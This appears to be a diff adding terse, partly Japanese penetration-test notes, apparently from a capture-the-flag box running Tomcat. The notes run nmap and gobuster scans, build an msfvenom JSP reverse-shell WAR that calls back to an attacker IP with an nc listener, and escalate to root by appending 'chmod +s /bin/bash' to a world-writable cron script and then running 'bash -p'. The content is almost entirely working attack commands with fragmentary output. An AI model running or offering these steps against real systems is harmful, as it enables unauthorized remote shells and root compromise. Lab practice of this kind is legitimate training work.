@@ -1,0 +1,31 @@
+nmap -sC -sV -oN nmap.log 10.48.140.91
+gobuster dir -u http://10.48.140.91:8080 -w /usr/share/wordlists/dirb/big.txt -x php -t 50 | tee gobuster.log
+
+For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above. 
+
+
+# 1. WARファイル生成（完了していれば不要）
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.141.239 LPORT=1234 -f war > reverse.war
+
+# 2. リスナー起動
+nc -lvnp 1234
+
+-rw-r--r-- 1 root root   39 Apr 24 16:03 test.txt
+
+cat /etc/crontab
+cd /home/jack && bash id.sh
+cat id.sh
+#!/bin/bash
+id > test.txt
+ls -l id.sh
+-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
+
+
+echo "chmod +s /bin/bash" >> id.sh
+cat id.sh
+#!/bin/bash
+id > test.txt
+chmod +s /bin/bash
+
+bash -p
+
